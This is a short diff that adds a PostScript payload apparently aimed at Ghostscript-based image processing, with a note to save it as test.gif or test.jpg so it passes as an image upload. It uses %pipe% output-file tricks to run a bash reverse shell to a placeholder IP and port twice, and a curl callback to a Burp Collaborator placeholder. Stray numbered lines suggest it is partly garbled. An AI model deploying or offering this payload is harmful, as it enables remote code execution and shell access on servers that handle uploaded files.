@@ -1,0 +1,18 @@
+%!PS
+(%pipe%bash -c 'bash -i >& /dev/tcp/yourip/yourport 0>&1') (w) file
+0 1 300367 {} for
+1.
+2.
+3.
+4.
+Note:
+Save as test.gif or test.jpg
+legal
+mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/yourip/yourport 0>&1') currentdevice putdeviceprops
+mark /OutputFile (%pipe%curl http://inputburpcollaborator) currentdevice putdeviceprops
+restore
+save
+userdict /setpagedevice undef
+{ legal } stopped { pop } if
+{ null restore } stopped { pop } if
+{save restore} stopped {} if
